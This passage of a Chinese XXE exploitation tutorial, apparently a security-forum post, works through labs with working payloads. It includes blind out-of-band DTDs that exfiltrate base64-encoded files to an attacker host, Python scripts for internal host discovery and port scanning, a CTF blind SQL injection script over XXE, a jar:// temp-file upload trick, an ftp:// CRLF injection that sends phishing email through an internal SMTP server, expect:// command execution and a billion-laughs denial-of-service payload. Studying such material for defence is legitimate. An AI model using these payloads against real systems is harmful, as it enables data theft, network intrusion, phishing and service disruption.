<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e8138df6-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e8138df6-ec17-1.png" alt="img"></a></p>
<p>我们试一下：</p>
<p><strong>结果如下图：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e844e770-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e844e770-ec17-1.png" alt="img"></a></p>
<p>可以看到，不但没有读到我们想要的文件，而且还给我们报了一堆错，怎么办？这个时候就要祭出我们的另一个神器了——CDATA ，简单的介绍如下(引用自我的一片介绍 XML 的博客)：</p>
<blockquote>
<p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者<br> “ 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</p>
<pre><code>&lt;![CDATA[</code></pre>
<pre><code>XXXXXXXXXXXXXXXXX

]]&gt;</code></pre>
<p>可以输入任意字符除了 ]]&gt; 不能嵌套</p>
<p>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来</p>
</blockquote>
<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p>
<p>首先，找到问题出现的地方，问题出现在</p>
<pre><code>...
&lt;!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"&gt; ]&gt;
&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre>
<p>引用并不接受可能会引起 xml  格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 “<!--[CDATA["和 “]]-->”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p>
<p><strong>结果如下图：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e885c2b8-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e885c2b8-ec17-1.png" alt="img"></a></p>
<p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在 xml 中调用，那么要想在 DTD<br> 中拼接，我们知道我们只有一种选择，就是使用 参数实体</p>
<p><strong>payload:</strong></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt; 
&lt;!DOCTYPE roottag [
&lt;!ENTITY % start "&lt;![CDATA["&gt;   
&lt;!ENTITY % goodies SYSTEM "file:///d:/test.txt"&gt;  
&lt;!ENTITY % end "]]&gt;"&gt;  
&lt;!ENTITY % dtd SYSTEM "http://ip/evil.dtd"&gt; 
%dtd; ]&gt; 

&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre>
<p><strong>evil.dtd</strong></p>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt; 
&lt;!ENTITY all "%start;%goodies;%end;"&gt;</code></pre>
<p><strong>结果如下图：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e8b7bd54-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002646-e8b7bd54-ec17-1.png" alt="img"></a></p>
<p>感兴趣的童鞋可以分析一下整个调用过程，因为我在下面的例子中有分析一个类似的例子，于是出于篇幅考虑我这里就不分析了。</p>
<blockquote>
<p><strong>注意：</strong></p>
<p>这里提一个点，如果是在 java 中 还有一个协议能代替 file 协议 ，那就是 netdoc ，使用方法我会在后面的分析 微信的 XXE<br> 的时候顺带演示</p>
</blockquote>
<h3 id="新的问题出现"><a href="#新的问题出现" class="headerlink" title="新的问题出现"></a><strong>新的问题出现</strong></h3><p>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</p>
<h3 id="新的解决方法"><a href="#新的解决方法" class="headerlink" title="新的解决方法"></a><strong>新的解决方法</strong></h3><p>想要外带就必须能发起请求，那么什么地方能发起请求呢？  很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p>
<h3 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件(Blind OOB XXE)"></a><strong>实验二：无回显读取本地敏感文件(Blind OOB XXE)</strong></h3><p><strong>xml.php</strong></p>
<pre><code>&lt;?php

libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?&gt;</code></pre>
<p><strong>test.dtd</strong></p>
<pre><code>&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt"&gt;
&lt;!ENTITY % int "&lt;!ENTITY % send SYSTEM 'http://ip:9999?p=%file;'&gt;"&gt;</code></pre>
<p><strong>2019.5.8 更新</strong></p>
<p>我发现上面这段代码由于解析的问题将 send 前面的 HTML 实体转化成了 % ,虽然我在下面做出了一些解释，但是因为存在复制粘贴代码的行为，因此我决定还是在这里用图片的形式再次展示一下我的代码</p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20190508205142-077ed10c-7190-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190508205142-077ed10c-7190-1.png" alt="img"></a></p>
<p><strong>payload：</strong></p>
<pre><code>&lt;!DOCTYPE convert [ 
&lt;!ENTITY % remote SYSTEM "http://ip/test.dtd"&gt;
%remote;%int;%send;
]&gt;</code></pre>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e8e966b0-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e8e966b0-ec17-1.png" alt="img"></a></p>
<p><strong>结果如下：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e90baeb4-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e90baeb4-ec17-1.png" alt="img"></a></p>
<p>我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错。</p>
<p><strong>整个调用过程：</strong></p>
<p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote  先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的  %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %,  所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
<h3 id="新的思考："><a href="#新的思考：" class="headerlink" title="新的思考："></a><strong>新的思考：</strong></h3><p>我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF  的童鞋应该很快反应过来，这其实非常类似于 SSRF  ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如  192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF  其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。</p>
<h3 id="新的利用："><a href="#新的利用：" class="headerlink" title="新的利用："></a><strong>新的利用：</strong></h3><p>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议</p>
<p><strong>如图所示:</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png" alt="img"></a></p>
<p>PHP在安装扩展以后还能支持的协议：</p>
<p><strong>如图所示：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e965b74c-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e965b74c-ec17-1.png" alt="img"></a></p>
<blockquote>
<p><strong>注意：</strong></p>
<p>1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7<br> update 7 和 Oracle JDK 1.6 update 35<br> 2.libxml 是 PHP 的 xml 支持</p>
</blockquote>
<h3 id="实验三：HTTP-内网主机探测"><a href="#实验三：HTTP-内网主机探测" class="headerlink" title="实验三：HTTP 内网主机探测"></a><strong>实验三：HTTP 内网主机探测</strong></h3><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file  协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取  /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p>
<p><strong>下面是一个探测脚本的实例：</strong></p>
<pre><code>import requests
import base64

#Origtional XML that the server accepts
#&lt;xml&gt;
#    &lt;stuff&gt;user&lt;/stuff&gt;
#&lt;/xml&gt;


def build_xml(string):
    xml = """&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;"""
    xml = xml + "\r\n" + """&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;"""
    xml = xml + "\r\n" + """&lt;!ENTITY xxe SYSTEM """ + '"' + string + '"' + """&gt;]&gt;"""
    xml = xml + "\r\n" + """&lt;xml&gt;"""
    xml = xml + "\r\n" + """    &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;"""
    xml = xml + "\r\n" + """&lt;/xml&gt;"""
    send_xml(xml)

def send_xml(xml):
    headers = {'Content-Type': 'application/xml'}
    x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
    print coded_string
#   print base64.b64decode(coded_string)
for i in range(1, 255):
    try:
        i = str(i)
        ip = '10.0.0.' + i
        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
        print string
        build_xml(string)
    except:
continue</code></pre>
<p><strong>返回结果：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9a5fb54-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9a5fb54-ec17-1.png" alt="img"></a></p>
<h3 id="实验四：HTTP-内网主机端口扫描"><a href="#实验四：HTTP-内网主机端口扫描" class="headerlink" title="实验四：HTTP 内网主机端口扫描"></a><strong>实验四：HTTP 内网主机端口扫描</strong></h3><p>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip  地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</p>
<p><strong>比如我们传入：</strong></p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;  
&lt;!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  
&lt;!ELEMENT data (#PCDATA)&gt;  
]&gt;
&lt;data&gt;4&lt;/data&gt;</code></pre>
<p><strong>返回结果：</strong></p>
<pre><code>javax.xml.bind.UnmarshalException  
 - with linked exception:
[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException
Exception Description: An error occurred unmarshalling the document  
Internal Exception: ████████████████████████: Connection refused</code></pre>
<p>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</p>
<p><strong>如下图所示：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9dea094-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9dea094-ec17-1.png" alt="img"></a></p>
<p>至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get  请求就能直接getshell 的 比如 strus2）</p>
<h3 id="实验五：内网盲注-CTF"><a href="#实验五：内网盲注-CTF" class="headerlink" title="实验五：内网盲注(CTF)"></a><strong>实验五：内网盲注(CTF)</strong></h3><p>2018 强网杯 有一道题就是利用  XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：</p>
<p>首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</p>
<p><strong>如图所示：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-ea03a74a-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-ea03a74a-ec17-1.png" alt="img"></a></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea345868-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea345868-ec17-1.png" alt="img"></a></p>
<p>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )</p>
<pre><code>/var/www/52dandan.cc/public_html/config.php</code></pre>
<p>拿到第一部分 flag</p>
<pre><code>&lt;?php
define(BASEDIR, "/var/www/52dandan.club/");
define(FLAG_SIG, 1);
define(SECRETFILE,'/var/www/52dandan.com/public_html/youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431');
....
?&gt;</code></pre>
<blockquote>
<p><strong>注意：</strong></p>
<p>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br> 过滤器的一个压缩的方法</p>
<pre><code>压缩：echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");
解压：echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1");</code></pre>
</blockquote>
<p>然后我们考虑内网有没有东西，我们读取</p>
<pre><code>/proc/net/arp
/etc/host</code></pre>
<p>找到内网的另一台服务器的 ip 地址 192.168.223.18</p>
<p>拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个  test.php  ，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE  ,我们的对服务器的请求都是在我们的远程 DTD 中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的  DTD 文件，于是我们的脚本就要挂在我们的 VPS 上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子</p>
<p><strong>示例代码：</strong></p>
<pre><code>import requests
url = 'http://39.107.33.75:33899/common.php'
s = requests.Session()
result = ''
data = {
        "name":"evil_man",
        "email":"testabcdefg@gmail.com",
        "comment":"""&lt;?xml version="1.0" encoding="utf-8"?&gt;
                &lt;!DOCTYPE root [
                &lt;!ENTITY % dtd SYSTEM "http://evil_host/evil.dtd"&gt;
                %dtd;]&gt;
                """
}

for i in range(0,28):
        for j in range(48,123):
                f = open('./evil.dtd','w')
            payload2 = """&lt;!ENTITY % file SYSTEM "php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3'-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary('{}'))then(0)else(1)end)-'1"&gt;
                &lt;!ENTITY % all "&lt;!ENTITY % send SYSTEM 'http://evil_host/?result=%file;'&gt;"&gt;
                %all;
                %send;""".format('_'*i+chr(j)+'_'*(27-i))
                f.write(payload2)
                f.close()
                print 'test {}'.format(chr(j))
                r = s.post(url,data=data)
                if "Oti3a3LeLPdkPkqKF84xs=" in r.content and chr(j)!='_':
                        result += chr(j)
                        print chr(j)
                        break
print result</code></pre>
<p>这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解</p>
<h3 id="实验六：文件上传"><a href="#实验六：文件上传" class="headerlink" title="实验六：文件上传"></a><strong>实验六：文件上传</strong></h3><p>我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java  中有一个比较神奇的协议 jar:// ， php  中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。</p>
<p><strong>jar:// 协议的格式：</strong></p>
<pre><code>jar:{url}!{path}</code></pre>
<p><strong>实例：</strong></p>
<pre><code>jar:http://host/application.jar!/file/within/the/zip

这个 ! 后面就是其需要从中解压出的文件</code></pre>
<p>jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar://  是没法远程加载文件的（因此 phar://  一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的   phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）</p>
<p><strong>jar 协议处理文件的过程：</strong></p>
<p>(1) 下载 jar/zip 文件到临时文件中<br> (2) 提取出我们指定的文件<br> (3) 删除临时文件</p>
<blockquote>
<p><strong>那么我们怎么找到我们下载的临时文件呢？</strong></p>
<p>因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用</p>
</blockquote>
<p>下面是我的一些测试过程：</p>
<p>我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码</p>
<p><strong>示例代码：</strong></p>
<p><strong>xml_test.java</strong></p>
<pre><code>package xml_test;
import java.io.File;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Attr;
import org.w3c.dom.Comment;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NamedNodeMap;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

/**
 * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上
 * @author zhanglong
 *
 */
public class xml_test
{
    public static void main(String[] args) throws Exception
    {
        DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
        DocumentBuilder db = dbf.newDocumentBuilder();

        Document doc = db.parse(new File("student.xml"));
        //获得根元素结点
        Element root = doc.getDocumentElement();

        parseElement(root);
    }

    private static void parseElement(Element element)
    {
        String tagName = element.getNodeName();

        NodeList children = element.getChildNodes();

        System.out.print("&lt;" + tagName);

        //element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断
        NamedNodeMap map = element.getAttributes();

        //如果该元素存在属性
        if(null != map)
        {
            for(int i = 0; i &lt; map.getLength(); i++)
            {
                //获得该元素的每一个属性
                Attr attr = (Attr)map.item(i);

                String attrName = attr.getName();
                String attrValue = attr.getValue();

                System.out.print(" " + attrName + "=\"" + attrValue + "\"");
            }
        }

        System.out.print("&gt;");

        for(int i = 0; i &lt; children.getLength(); i++)
        {
            Node node = children.item(i);
            //获得结点的类型
            short nodeType = node.getNodeType();

            if(nodeType == Node.ELEMENT_NODE)
            {
                //是元素，继续递归
                parseElement((Element)node);
            }
            else if(nodeType == Node.TEXT_NODE)
            {
                //递归出口
                System.out.print(node.getNodeValue());
            }
            else if(nodeType == Node.COMMENT_NODE)
            {
                System.out.print("&lt;!--");

                Comment comment = (Comment)node;

                //注释内容
                String data = comment.getData();

                System.out.print(data);

                System.out.print("--&gt;");
            }
        }

        System.out.print("&lt;/" + tagName + "&gt;");
    }
}</code></pre>
<p>有了这个源码以后，我们需要在本地建立一个 xml 文件 ，我取名为 student.xml</p>
<p><strong>student.xml</strong></p>
<pre><code>&lt;!DOCTYPE convert [ 
&lt;!ENTITY  remote SYSTEM "jar:http://localhost:9999/jar.zip!/wm.php"&gt;
]&gt;
&lt;convert&gt;&amp;remote;&lt;/convert&gt;</code></pre>
<p><strong>目录结构如下图：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea691684-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea691684-ec17-1.png" alt="img"></a></p>
<p>可以清楚地看到我的请求是向自己本地的 9999 端口发出的，那么9999 端口上有什么服务呢？实际上是我自己用 python 写的一个 TCP 服务器</p>
<p><strong>示例代码：</strong></p>
<p><strong>sever.py</strong></p>
<pre><code>import sys 
import time 
import threading 
import socketserver 
from urllib.parse import quote 
import http.client as httpc 

listen_host = 'localhost' 
listen_port = 9999 
jar_file = sys.argv[1]

class JarRequestHandler(socketserver.BaseRequestHandler):  
    def handle(self):
        http_req = b''
        print('New connection:',self.client_address)
        while b'\r\n\r\n' not in http_req:
            try:
                http_req += self.request.recv(4096)
                print('Client req:\r\n',http_req.decode())
                jf = open(jar_file, 'rb')
                contents = jf.read()
                headers = ('''HTTP/1.0 200 OK\r\n'''
                '''Content-Type: application/java-archive\r\n\r\n''')
                self.request.sendall(headers.encode('ascii'))

                self.request.sendall(contents[:-1])
                time.sleep(30)
                print(30)
                self.request.sendall(contents[-1:])

            except Exception as e:
                print ("get error at:"+str(e))


if __name__ == '__main__':

    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
    print ('waiting for connection...') 
    server_thread = threading.Thread(target=jarserver.serve_forever) 
    server_thread.daemon = True 
    server_thread.start() 
    server_thread.join()</code></pre>
<p>这个服务器的目的就是接受客户端的请求，然后向客户端发送一个我们运行时就传入的参数指定的文件，但是还没完，实际上我在这里加了一个 sleep(30)，这个的目的我后面再说</p>
<p>既然是文件上传，那我们又要回到 jar 协议解析文件的过程中了</p>
<blockquote>
<p><strong>jar 协议处理文件的过程：</strong></p>
<p>(1) 下载 jar/zip 文件到临时文件中<br> (2) 提取出我们指定的文件<br> (3) 删除临时文件</p>
</blockquote>
<p>那我们怎么找到这个临时的文件夹呢？不用想，肯定是通过报错的形式展现，如果我们请求的</p>
<pre><code>jar:http://localhost:9999/jar.zip!/1.php</code></pre>
<p>1.php 在这个 jar.zip 中没有的话，java 解析器就会报错，说在这个临时文件中找不到这个文件</p>
<p><strong>如下图：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-eaa1b2aa-ec17-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-eaa1b2aa-ec17-1.png" alt="img"></a></p>
<p>既然找到了临时文件的路径，我们就要考虑怎么使用这个文件了（或者说怎么让这个文件能更长时间的停留在我们的系统之中，我想到的方式就是sleep()）但是还有一个问题，因为我们要利用的时候肯定是在文件没有完全传输成果的时候，因此为了文件的完整性，我考虑在传输前就使用 hex 编辑器在文件末尾添加垃圾字符，这样就能完美的解决这个问题</p>
<p><strong>下面是我的实验录屏：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eae69596-ec17-1.gif"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002650-eae69596-ec17-1.gif" alt="img"></a></p>
<p>实验就到这一步了，怎么利用就看各位大佬的了（坏笑）</p>
<p>我后来在LCTF 2018 出了这样一个 CTF 题目，详细的 wp 可以看我的[这篇文章](<a href="http://www.k0rz3n.com/2018/11/19/LCTF">http://www.k0rz3n.com/2018/11/19/LCTF</a> 2018 T4lk 1s ch34p,sh0w m3 the sh31l 详细分析/)</p>
<h3 id="实验七：钓鱼："><a href="#实验七：钓鱼：" class="headerlink" title="实验七：钓鱼："></a><strong>实验七：钓鱼：</strong></h3><p>如果内网有一台易受攻击的 SMTP 服务器，我们就能利用  ftp:// 协议结合 CRLF 注入向其发送任意命令，也就是可以指定其发送任意邮件给任意人，这样就伪造了信息源，造成钓鱼（一下实例来自fb 的一篇文章 ）</p>
<p>Java支持在sun.net.ftp.impl.FtpClient中的ftp URI。因此，我们可以指定用户名和密码，例如<a href="ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。">ftp://user:password@host:port/test.txt，FTP客户端将在连接中发送相应的USER命令。</a></p>
<p>但是如果我们将%0D%0A (CRLF)添加到URL的user部分的任意位置，我们就可以终止USER命令并向FTP会话中注入一个新的命令，即允许我们向25端口发送任意的SMTP命令：</p>
<p><strong>示例代码：</strong></p>
<pre><code>ftp://a%0D%0A
EHLO%20a%0D%0A
MAIL%20FROM%3A%3Csupport%40VULNERABLESYSTEM.com%3E%0D%0A
RCPT%20TO%3A%3Cvictim%40gmail.com%3E%0D%0A
DATA%0D%0A
From%3A%20support%40VULNERABLESYSTEM.com%0A
To%3A%20victim%40gmail.com%0A
Subject%3A%20test%0A
%0A
test!%0A
%0D%0A
.%0D%0A
QUIT%0D%0A
:a@VULNERABLESYSTEM.com:25</code></pre>
<p>当FTP客户端使用此URL连接时，以下命令将会被发送给VULNERABLESYSTEM.com上的邮件服务器：</p>
<p><strong>示例代码：</strong></p>
<pre><code>ftp://a
EHLO a
MAIL FROM: &lt;support@VULNERABLESYSTEM.com&gt;
RCPT TO: &lt;victim@gmail.com&gt;
DATA
From: support@VULNERABLESYSTEM.com
To: victim@gmail.com
Subject: Reset your password
We need to confirm your identity. Confirm your password here: http://PHISHING_URL.com
.
QUIT
:support@VULNERABLESYSTEM.com:25</code></pre>
<p>这意味着攻击者可以从从受信任的来源发送钓鱼邮件（例如：帐户重置链接）并绕过垃圾邮件过滤器的检测。除了链接之外，甚至我们也可以发送附件。</p>
<h3 id="实验八：其他："><a href="#实验八：其他：" class="headerlink" title="实验八：其他："></a><strong>实验八：其他：</strong></h3><p>除了上面实验中的一些常见利用以外还有一些不是很常用或者比较鸡肋的利用方式，为了完整性我在这一节简单的说一下：</p>
<h4 id="1-PHP-expect-RCE"><a href="#1-PHP-expect-RCE" class="headerlink" title="1.PHP expect RCE"></a><strong>1.PHP expect RCE</strong></h4><p>由于 PHP 的 expect 并不是默认安装扩展，如果安装了这个expect 扩展我们就能直接利用 XXE 进行 RCE</p>
<p><strong>示例代码：</strong></p>
<pre><code>&lt;!DOCTYPE root[&lt;!ENTITY cmd SYSTEM "expect://id"&gt;]&gt;
&lt;dir&gt;
&lt;file&gt;&amp;cmd;&lt;/file&gt;
&lt;/dir&gt;</code></pre>
<h4 id="2-利用-XXE-进行-DOS-攻击"><a href="#2-利用-XXE-进行-DOS-攻击" class="headerlink" title="2. 利用 XXE 进行 DOS 攻击"></a><strong>2. 利用 XXE 进行 DOS 攻击</strong></h4><p><strong>示例代码：</strong></p>
<pre><code>&lt;?xml version="1.0"?&gt;
     &lt;!DOCTYPE lolz [
     &lt;!ENTITY lol "lol"&gt;
     &lt;!ENTITY lol2 "&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;"&gt;
     &lt;!ENTITY lol3 "&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;"&gt;
     &lt;!ENTITY lol4 "&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;"&gt;
     &lt;!ENTITY lol5 "&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;"&gt;
     &lt;!ENTITY lol6 "&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;"&gt;
     &lt;!ENTITY lol7 "&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;"&gt;
     &lt;!ENTITY lol8 "&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;"&gt;
     &lt;!ENTITY lol9 "&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;"&gt;
     ]&gt;
     &lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre>
<h2 id="五、真实的-XXE-出现在哪"><a href="#五、真实的-XXE-出现在哪" class="headerlink" title="五、真实的 XXE 出现在哪"></a><strong>五、真实的 XXE 出现在哪</strong></h2><p>我们刚刚说了那么多，都是只是我们对这个漏洞的理解，但是好像还没说这种漏洞出现在什么地方</p>
<p>如今的 web 时代，是一个前后端分离的时代，有人说 MVC  就是前后端分离，但我觉得这种分离的并不彻底，后端还是要尝试去调用渲染类去控制前端的渲染，我所说的前后端分离是，后端 api  只负责接受约定好要传入的数据，然后经过一系列的黑盒运算，将得到结果以 json  格式返回给前端，前端只负责坐享其成，拿到数据json.decode 就行了（这里的后端可以是后台代码，也可以是外部的api  接口，这里的前端可以是传统意义的前端，也可以是后台代码）</p>
<p>那么问题经常就出现在 api 接口能解析客户端传过来的 xml 代码，并且直接外部实体的引用，比如下面这个</p>
<h3 id="实例一：模拟情况"><a href="#实例一：模拟情况" class="headerlink" title="实例一：模拟情况"></a><strong>实例一：模拟情况</strong></h3><p><strong>示例代码：</strong></p>
